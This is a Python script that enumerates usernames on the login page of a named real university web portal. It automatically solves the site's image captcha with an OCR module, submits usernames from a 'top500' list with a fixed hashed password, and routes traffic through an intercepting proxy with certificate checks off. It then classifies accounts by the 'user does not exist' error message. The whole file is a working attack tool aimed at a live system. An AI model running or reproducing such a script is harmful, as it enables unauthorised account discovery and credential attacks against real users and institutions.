import time

import requests
import sys
sys.path.append("../")

import ImgCodeRegonize.recognize as rec

def main():
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Cookie': 'JSESSIONID=E5CD95603F01863C0D0A0F9428B774AD; BIGipServerpool-tyb-cggl-mh=352522412.36895.0000'
    }
    prefix = "jfif"
    c = rec.ImgCodeRegonize()

    with open("top500.txt", "r") as f:
        for username in f.readlines():
            time.sleep(1)
            url = 'https://pecg.hust.edu.cn/wescms/getpic'
            ImgCode = c.ImgText(url=url, headers=header, prefix=prefix)

            proxy = {"http": "http://127.0.0.1:8081","https": "http://127.0.0.1:8081"}

            url = 'https://pecg.hust.edu.cn/wescms/wescms/login'

            data = {
                'login_table':'1',
                'username':f"{username}",
                'password':'450372aa7227bb673ca6ed3195fb62ad',
                'randomCode': f"{ImgCode}"
            }

            resHeader = requests.post(url=url,data=data,headers=header,proxies=proxy,verify=False,allow_redirects=False).headers

            if 'Location' in resHeader and '/wescms/wescms/login?username=' in resHeader['Location']:
                url = 'https://pecg.hust.edu.cn' + resHeader['Location']
                res = requests.get(url,headers=header,proxies=proxy,verify=False)
                if '用户不存在' in res.text:
                    print(f"[-] username: {username}")
                else:
                    print(f"[?] username: {username}")
            else:
                print(f"[?] username: {username}")
    f.close()

if __name__ == '__main__':
    main()